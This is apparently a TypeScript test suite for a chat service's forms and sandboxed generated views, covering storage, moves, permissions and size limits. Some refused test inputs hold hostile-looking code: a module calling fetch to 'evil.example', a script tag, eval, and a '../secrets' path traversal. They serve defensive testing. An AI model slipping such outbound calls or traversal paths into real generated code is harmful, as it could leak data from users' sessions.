// The agent's forms and generated views in ChatApi (worker/Views.ts, docs/features/views.md), through the real handler
// on this file's schema of the compose Postgres (`pnpm db:up`) and the real presentation realm (worker/ViewRealm.ts):
// adding a form and a generated view, a move in a generated view, and a question asked from either.
import { Effect, Redacted, Stream } from "effect"
import { SqlClient } from "effect/sql"
import { describe, expect, test } from "vitest"
import { TIC_TAC_TOE, TIC_TAC_TOE_STATE } from "../src/features/views/renderer.ts"
import * as Database from "../db/Database.ts"
import type { Actor } from "./Actor.ts"
import { tracked } from "./test/branch.ts"
import { harness, recorded, testFile } from "./test/harness.ts"
import * as Views from "./Views.ts"

const runtime = testFile("agent-views")

const member: Actor = { subject: { kind: "person", id: "person-member" }, role: "member" }

const open = (actor: Actor = member) => harness(runtime, () => Stream.empty, { actor })

type Harness = Awaited<ReturnType<typeof open>>

const post = (h: Harness, path: string, body: unknown) =>
  h.fetch(path, {
    method: "POST",
    body: (typeof body === "string" || body instanceof Uint8Array ? body : JSON.stringify(body)) as BodyInit,
  })

/** The form `ui/form` adds for "clone a repository for me". */
const cloneForm = () => ({
  id: crypto.randomUUID(),
  template: "form",
  props: {
    title: "Which repository?",
    schema: {
      type: "object",
      properties: { url: { type: "string", title: "Repository URL" } },
      required: ["url"],
    },
    submitLabel: "Clone",
  },
})

/** The board `ui/render` adds for "show me a tic-tac-toe board". */
const board = (code = TIC_TAC_TOE) => ({
  id: crypto.randomUUID(),
  template: "generated",
  title: "Tic-tac-toe",
  size: "inline",
  code,
  props: {},
  state: TIC_TAC_TOE_STATE,
})

const viewRow = (id: string) =>
  runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) =>
    sql<{
      readonly template: string
      readonly state: unknown
      readonly html: string | null
      readonly interactions: unknown
      readonly revision: number
    }>`SELECT template, state, html, interactions, revision FROM views WHERE id = ${id}`)).then(([row]) => row)

const question = (text: string, extra: Record<string, unknown> = {}) => ({
  id: crypto.randomUUID(),
  answerId: crypto.randomUUID(),
  text,
  ...extra,
})

describe("a form", () => {
  test("is added open, with its props, and refused when it asks for a secret or has no field", async () => {
    const h = await open()
    const form = cloneForm()
    expect((await post(h, "/api/views", form)).status).toBe(202)
    expect(await viewRow(form.id)).toMatchObject({ template: "form", state: { submitted: false }, html: null })

    const secret = cloneForm()
    const withPassword = {
      ...secret,
      props: { ...secret.props, schema: { type: "object", properties: { token: { type: "string", format: "password" } } } },
    }
    const empty = { ...cloneForm(), props: { ...secret.props, schema: { type: "object", properties: {} } } }
    // A secret a reference reaches is a secret too.
    const referenced = {
      ...cloneForm(),
      props: {
        ...secret.props,
        schema: {
          type: "object",
          properties: { token: { $ref: "#/$defs/token" } },
          $defs: { token: { type: "string", writeOnly: true } },
        },
      },
    }
    for (const refused of [withPassword, referenced, empty]) {
      const response = await post(h, "/api/views", refused)
      expect([response.status, await response.json()]).toEqual([400, { code: "refused" }])
    }
    expect(h.line("chat.view.add").filter((line) => line.annotations.status === 400).map((line) => line.annotations.reason))
      .toEqual(["secret", "secret", "no_fields"])
  })

  test("its submission is the person's next question, and the form is submitted with it, once", async () => {
    const h = await open()
    const form = cloneForm()
    await post(h, "/api/views", form)
    const values = { url: "https://github.com/octocat/Spoon-Knife" }
    const submission = question("Clone", { source: { viewId: form.id, event: "submit" }, data: values })

    expect((await h.ask(submission)).status).toBe(202)
    expect(await viewRow(form.id)).toMatchObject({
      state: { submitted: true, values, questionId: submission.id },
      revision: 1,
    })
    // The answer's turn reads the values beside the label.
    const turn = await (await h.fetch(`/api/answers/${submission.answerId}`)).json() as { readonly question: string }
    expect(turn.question).toBe(`Clone\nThe values the person sent with it: {"url": "https://github.com/octocat/Spoon-Knife"}`)

    // The same submission again changes nothing; another one is refused, and so are values the form doesn't take.
    expect((await h.ask(submission)).status).toBe(200)
    const second = await h.ask(question("Clone", { source: { viewId: form.id, event: "submit" }, data: values }))
    expect([second.status, await second.json()]).toEqual([409, { message: "This form was already sent." }])
    const fresh = cloneForm()
    await post(h, "/api/views", fresh)
    for (const data of [{ url: 4 }, { url: "https://github.com/a/b", extra: "x" }, {}]) {
      const wrong = await h.ask(question("Clone", { source: { viewId: fresh.id, event: "submit" }, data }))
      expect(wrong.status).toBe(400)
    }
    const undeclared = await h.ask(question("Clone", { source: { viewId: fresh.id, event: "cell" }, data: values }))
    expect(undeclared.status).toBe(400)
    expect(await viewRow(fresh.id)).toMatchObject({ state: { submitted: false }, revision: 0 })
    // No record carries the values.
    expect(recorded(h)).not.toContain("Spoon-Knife")
  })

  test("the same question id with other values, or from another form, is another question: 409, and nothing changes", async () => {
    const h = await open()
    const [form, other] = [cloneForm(), cloneForm()]
    await post(h, "/api/views", form)
    await post(h, "/api/views", other)
    const submission = question("Clone", { source: { viewId: form.id, event: "submit" }, data: { url: "https://a.example/x" } })
    expect((await h.ask(submission)).status).toBe(202)
    expect((await h.ask({ ...submission, data: { url: "https://b.example/y" } })).status).toBe(409)
    expect((await h.ask({ ...submission, source: { viewId: other.id, event: "submit" } })).status).toBe(409)
    expect(await viewRow(other.id)).toMatchObject({ state: { submitted: false } })
  })

  test("the history counts a submission's values in its budget, as the model reads them", async () => {
    const h = await open()
    const big = "v".repeat(13_000)
    for (let index = 0; index < 2; index++) {
      const form = cloneForm()
      await post(h, "/api/views", form)
      const sent = question("Clone", { source: { viewId: form.id, event: "submit" }, data: { url: big } })
      expect((await h.ask(sent)).status).toBe(202)
      await post(h, `/api/answers/${sent.answerId}`, { status: "done", text: "Done." })
    }
    const last = question("And now?")
    expect((await h.ask(last)).status).toBe(202)
    const turn = await (await h.fetch(`/api/answers/${last.answerId}`)).json() as {
      readonly history: ReadonlyArray<{ readonly question: string }>
    }
    // Two submissions of 13,000 characters each would pass the 24,000-character budget: only the latest fits.
    expect(turn.history).toHaveLength(1)
    expect(turn.history[0]!.question).toContain(big)
  })

  test("a question names only a view in its own conversation", async () => {
    const h = await open()
    const missing = await h.ask(
      question("Clone", { source: { viewId: crypto.randomUUID(), event: "submit" }, data: { url: "x" } }),
    )
    expect([missing.status, await missing.json()]).toEqual([400, { message: "That form or view isn't in this conversation." }])
  })
})

describe("a generated view", () => {
  test("is checked and rendered by ChatApi, which keeps its own HTML and the module's events", async () => {
    const h = await open()
    const view = board()
    expect((await post(h, "/api/views", view)).status).toBe(202)
    const row = await viewRow(view.id)
    expect(row).toMatchObject({
      template: "generated",
      state: TIC_TAC_TOE_STATE,
      interactions: { cell: { kind: "state" }, reset: { kind: "state" } },
      revision: 0,
    })
    expect(row!.html).toContain(`data-event="cell:4"`)
    expect(row!.html).toContain("X to move")
    // The same add again is the same view; the device never gets the module.
    expect((await post(h, "/api/views", view)).status).toBe(200)
    expect(Views.SYNCED_VIEW_COLUMNS).not.toContain("code")
    expect(h.count(Views.renders, { outcome: "rendered", door: "add" })).toBe(1)
  })

  test("a module that fails its check or its render is 422 with the detail for the renderer, and never logged", async () => {
    const h = await open()
    const cases = [
      board(`import { Card } from "@smthrs/ui"\nexport default function View() { return <script>{"SENTINEL_CODE"}</script> }`),
      board(`export default function View() { return <div>{fetch("https://evil.example/SENTINEL_CODE")}</div> }`),
      board(`export default function View() { throw new Error("SENTINEL_CODE") }`),
      board(`export default function View() { while (true) {} }`),
    ]
    for (const view of cases) {
      const response = await post(h, "/api/views", view)
      const body = await response.json() as { readonly code: string; readonly detail: unknown }
      expect([response.status, body.code]).toEqual([422, "not_rendered"])
      expect(typeof body.detail).toBe("string")
      expect(await viewRow(view.id)).toBeUndefined()
    }
    expect(recorded(h)).not.toContain("SENTINEL_CODE")
    expect(h.count(Views.renders, { outcome: "not_rendered", door: "add" })).toBe(4)
  })

  test("a move runs the module's reduce from the state ChatApi keeps, and a stale or undeclared move changes nothing", async () => {
    const h = await open()
    const view = board()
    await post(h, "/api/views", view)
    const move = (body: Record<string, unknown>) =>
      post(h, `/api/views/${view.id}/state`, { moveId: crypto.randomUUID(), ...body })

    const first = await move({ revision: 0, event: { name: "cell", arg: "4" } })
    expect([first.status, await first.json()]).toEqual([200, { txid: expect.any(Number), revision: 1 }])
    const after = await viewRow(view.id)
    expect(after).toMatchObject({ state: { cells: ["", "", "", "", "X", "", "", "", ""], turn: "O" }, revision: 1 })
    expect(after!.html).toContain("O to move")

    // Another device's move against the board before: refused, with the revision to show.
    const stale = await move({ revision: 0, event: { name: "cell", arg: "0" } })
    expect([stale.status, await stale.json()]).toEqual([409, { code: "stale", revision: 1 }])
    expect((await move({ revision: 1, event: { name: "erase" } })).status).toBe(400)
    expect((await move({ revision: 1, event: { name: "cell", arg: "x".repeat(300) } })).status).toBe(400)
    expect((await post(h, `/api/views/${crypto.randomUUID()}/state`, { moveId: "m", revision: 0, event: { name: "cell" } }))
      .status).toBe(404)
    expect(await viewRow(view.id)).toMatchObject({ revision: 1 })
    expect(h.line("chat.view.state").map((line) => line.annotations.status)).toEqual([200, 409, 400, 400, 404])
  })

  test("a move sent again, its answer lost, answers the revision it made and changes nothing", async () => {
    const h = await open()
    const view = board()
    await post(h, "/api/views", view)
    const once = { moveId: "run-1/call/0.0", revision: 0, event: { name: "cell", arg: "4" } }
    expect(await (await post(h, `/api/views/${view.id}/state`, once)).json()).toEqual({ txid: expect.any(Number), revision: 1 })
    const again = await post(h, `/api/views/${view.id}/state`, once)
    expect([again.status, await again.json()]).toEqual([200, { txid: null, revision: 1 }])
    expect(await viewRow(view.id)).toMatchObject({ revision: 1, state: { turn: "O" } })
    expect(h.line("chat.view.state").at(-1)!.annotations).toMatchObject({ status: 200, existing: true })
  })

  test("no record carries a move's event, even one the module never declared", async () => {
    const h = await open()
    const view = board()
    await post(h, "/api/views", view)
    const sentinel = { moveId: "m-1", revision: 0, event: { name: "SENTINELEVENT", arg: "SENTINELARG" } }
    expect((await post(h, `/api/views/${view.id}/state`, sentinel)).status).toBe(400)
    expect((await h.ask(question("Go", { source: { viewId: view.id, event: "SENTINELEVENT" } }))).status).toBe(400)
    expect(recorded(h)).not.toContain("SENTINEL")
  })

  test("only someone who may ask in the conversation moves, and a message event is a question", async () => {
    const h = await open()
    const view = board(TIC_TAC_TOE.replace(
      `reset: { kind: "state" } }`,
      `reset: { kind: "state" }, again: { kind: "message", label: "Play again" } }`,
    ))
    expect((await post(h, "/api/views", view)).status).toBe(202)
    const signedOut = await harness(runtime, () => Stream.empty, {})
    expect((await post(signedOut, `/api/views/${view.id}/state`, {
      moveId: "m",
      revision: 0,
      event: { name: "cell", arg: "0" },
    })).status).toBe(401)
    expect((await h.ask(question("Play again", { source: { viewId: view.id, event: "again" } }))).status).toBe(202)
    expect((await h.ask(question("Move", { source: { viewId: view.id, event: "cell" } }))).status).toBe(400)
  })
})

/** A module that renders the board and whose `reduce` is `reduce`. */
const reducing = (reduce: string) =>
  `import { Button } from "@smthrs/ui"
export const interactions = { cell: { kind: "state" } } as const
export const reduce = ${reduce}
export default function View() { return <Button data-event="cell:0">Cell</Button> }`

describe("a move ChatApi can't make", () => {
  const moveIn = (h: Harness, viewId: string, body: unknown = { moveId: crypto.randomUUID(), revision: 0, event: { name: "cell", arg: "0" } }) =>
    post(h, `/api/views/${viewId}/state`, body)

  test("a reduce that throws, returns no state, or returns a state over 16 KiB changes nothing", async () => {
    const h = await open()
    for (const reduce of [`() => { throw new Error("no") }`, `() => undefined`, `() => ({ big: "x".repeat(20000) })`]) {
      const view = board(reducing(reduce))
      expect((await post(h, "/api/views", view)).status).toBe(202)
      const response = await moveIn(h, view.id)
      expect([response.status, await response.json()]).toEqual([422, { code: "not_rendered" }])
      expect(await viewRow(view.id)).toMatchObject({ revision: 0, state: TIC_TAC_TOE_STATE })
    }
    expect(h.count(Views.renders, { outcome: "not_rendered", door: "state" })).toBe(3)
  })

  test("a module that no longer passes its check is 422, and the view stays as it was", async () => {
    const h = await open()
    const view = board()
    await post(h, "/api/views", view)
    await runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) =>
      sql`UPDATE views SET code = 'export default function View() { return eval("1") }' WHERE id = ${view.id}`))
    expect((await moveIn(h, view.id)).status).toBe(422)
    expect(await viewRow(view.id)).toMatchObject({ revision: 0 })
  })

  test("refuses another method, a body that isn't a move or is too large, a Guest, and someone who may not edit", async () => {
    const h = await open()
    const view = board()
    await post(h, "/api/views", view)
    const get = await h.fetch(`/api/views/${view.id}/state`)
    expect([get.status, get.headers.get("allow")]).toEqual([405, "POST"])
    expect((await moveIn(h, view.id, "not json")).status).toBe(400)
    expect((await moveIn(h, view.id, { revision: 0, event: { name: "cell" } })).status).toBe(400)
    expect((await moveIn(h, view.id, "x".repeat(9_000))).status).toBe(413)
    expect((await moveIn(h, view.id, new Uint8Array([0x7b, 0xff, 0xfe]))).status).toBe(400)
    const guest = await open({ ...member, role: "guest" })
    expect((await moveIn(guest, view.id)).status).toBe(403)
    // A view in someone else's branch, which the Member may not edit.
    const theirs = await tracked(runtime, "github/octocat/spoon-knife", `theirs-${crypto.randomUUID().slice(0, 8)}`, "open", "person-owner")
    await runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) =>
      sql`UPDATE views SET conversation_id = ${theirs.conversationId} WHERE id = ${view.id}`))
    expect((await moveIn(h, view.id)).status).toBe(403)
    expect(await viewRow(view.id)).toMatchObject({ revision: 0 })
  })

  test("Postgres unreachable answers 503, logged by its SQL reason", async () => {
    const unreachable = Database.layer(Effect.succeed(Redacted.make("postgresql://nobody:nothing@127.0.0.1:1/none")))
    const h = await harness(runtime, () => Stream.empty, { actor: member, database: unreachable })
    const response = await moveIn(h, crypto.randomUUID())
    expect([response.status, await response.json()]).toEqual([503, { code: "unavailable" }])
    expect(h.only("chat.view.state").annotations).toMatchObject({ status: 503, errorCode: expect.stringMatching(/^sql:/) })
  })
})

describe("a generated view's HTML", () => {
  test("over 256 KiB is 422 with a detail for the renderer, when added and after a move", async () => {
    const h = await open()
    const huge = board(`export default function View({ state }: { state: { n: number } }) {
  return <div>{Array.from({ length: state.n }, (_, index) => <p key={index}>{"x".repeat(1000)}</p>)}</div>
}
export const interactions = { grow: { kind: "state" } } as const
export const reduce = (state: { n: number }) => ({ n: state.n * 100 })`)
    const refused = await post(h, "/api/views", { ...huge, state: { n: 300 } })
    const body = await refused.json() as { code: string; detail: string }
    expect([refused.status, body.code]).toEqual([422, "not_rendered"])
    expect(body.detail).toContain("bytes of HTML")
    expect((await post(h, "/api/views", { ...huge, state: { n: 3 } })).status).toBe(202)
    const grown = await post(h, `/api/views/${huge.id}/state`, { moveId: "m", revision: 0, event: { name: "grow" } })
    expect(grown.status).toBe(422)
    expect(await viewRow(huge.id)).toMatchObject({ revision: 0 })
  })
})

describe("a question's values", () => {
  test("near the 16 KiB bound are stored, though jsonb prints them longer", async () => {
    const h = await open()
    const one = cloneForm()
    await post(h, "/api/views", one)
    const data = { url: "u".repeat(16_370) }
    expect(JSON.stringify(data).length).toBeLessThanOrEqual(16_384)
    expect((await h.ask(question("Clone", { source: { viewId: one.id, event: "submit" }, data }))).status).toBe(202)
  })
})

describe("a generated view's first state", () => {
  test("over 16 KiB is 422; null is kept as null", async () => {
    const h = await open()
    const big = { ...board(), state: { cells: "x".repeat(20_000) } }
    const refused = await post(h, "/api/views", big)
    expect([refused.status, ((await refused.json()) as { code: string }).code]).toEqual([422, "not_rendered"])
    // The board needs its state to render; a view that reads none renders with null.
    const none = { ...board(reducing("(state) => state")), state: null }
    expect((await post(h, "/api/views", none)).status).toBe(202)
    expect(await viewRow(none.id)).toMatchObject({ state: null })
  })
})

describe("a question from a view", () => {
  test("a form sent with no values is refused; a view's message event keeps the values it sent", async () => {
    const h = await open()
    const form = cloneForm()
    await post(h, "/api/views", form)
    expect((await h.ask(question("Clone", { source: { viewId: form.id, event: "submit" } }))).status).toBe(400)
    const view = board(TIC_TAC_TOE.replace(
      `reset: { kind: "state" } }`,
      `reset: { kind: "state" }, again: { kind: "message", label: "Play again" } }`,
    ))
    await post(h, "/api/views", view)
    const asked = question("Play again", { source: { viewId: view.id, event: "again" }, data: { level: "hard" } })
    expect((await h.ask(asked)).status).toBe(202)
    const [stored] = await runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) =>
      sql<{ readonly data: unknown }>`SELECT data FROM messages WHERE id = ${asked.id}`))
    expect(stored!.data).toEqual({ level: "hard" })
  })
})

describe("a repository's view and its issues view", () => {
  const propsOf = (id: string) =>
    runtime.runPromise(Effect.flatMap(SqlClient.SqlClient, (sql) =>
      sql<{ readonly template: string; readonly props: unknown; readonly state: unknown; readonly html: unknown }>`
        SELECT template, props, state, html FROM views WHERE id = ${id}`)).then(([row]) => row)

  test("is added with its props alone, once by its id, and refused for a name GitHub couldn't have", async () => {
    const h = await open()
    const repo = {
      id: crypto.randomUUID(),
      template: "repo",
      props: { repo: "octocat/Spoon-Knife", ref: "main", kind: "blob", path: "docs/README.md" },
    }
    expect((await post(h, "/api/views", repo)).status).toBe(202)
    expect(await propsOf(repo.id)).toEqual({ template: "repo", props: repo.props, state: null, html: null })
    // The same view again is the add that landed before; another view under its id is refused.
    const again = await post(h, "/api/views", repo)
    expect([again.status, await again.json()]).toEqual([200, { txid: null }])
    const other = await post(h, "/api/views", { ...repo, props: { repo: "octocat/Hello-World" } })
    expect([other.status, await other.json()]).toEqual([409, { code: "id_taken" }])

    const issues = { id: crypto.randomUUID(), template: "issues", props: { repo: "smithersai/smithers" } }
    expect((await post(h, "/api/views", issues)).status).toBe(202)
    expect(await propsOf(issues.id)).toEqual({ template: "issues", props: issues.props, state: null, html: null })

    for (
      const props of [
        { repo: "app/widgets" },
        { repo: "octocat" },
        { repo: "a/b/c" },
        { repo: "octocat/Spoon-Knife", path: "../secrets" },
        { repo: "octocat/Spoon-Knife", path: "/README.md" },
        { repo: "octocat/Spoon-Knife", ref: "a branch" },
        { repo: "octocat/Spoon-Knife", kind: "commit" },
      ]
    ) {
      const refused = await post(h, "/api/views", { id: crypto.randomUUID(), template: "repo", props })
      expect([JSON.stringify(props), refused.status]).toEqual([JSON.stringify(props), 400])
    }
    const refusedIssues = await post(h, "/api/views", { id: crypto.randomUUID(), template: "issues", props: { repo: "api/x" } })
    expect(refusedIssues.status).toBe(400)
    expect(h.line("chat.view.add").filter((line) => line.annotations.status === 202).map((line) => line.annotations.template))
      .toEqual(["repo", "issues"])
  })

  test("asks nothing: a question naming one is refused, and a Guest can't add one", async () => {
    const h = await open()
    const repo = { id: crypto.randomUUID(), template: "repo", props: { repo: "octocat/Spoon-Knife" } }
    await post(h, "/api/views", repo)
    expect((await h.ask(question("Open", { source: { viewId: repo.id, event: "open" } }))).status).toBe(400)
    const guest = await open({ subject: { kind: "person", id: "person-guest" }, role: "guest" })
    const refused = await post(guest, "/api/views", { ...repo, id: crypto.randomUUID() })
    expect([refused.status, await refused.json()]).toEqual([403, { code: "forbidden" }])
  })
})
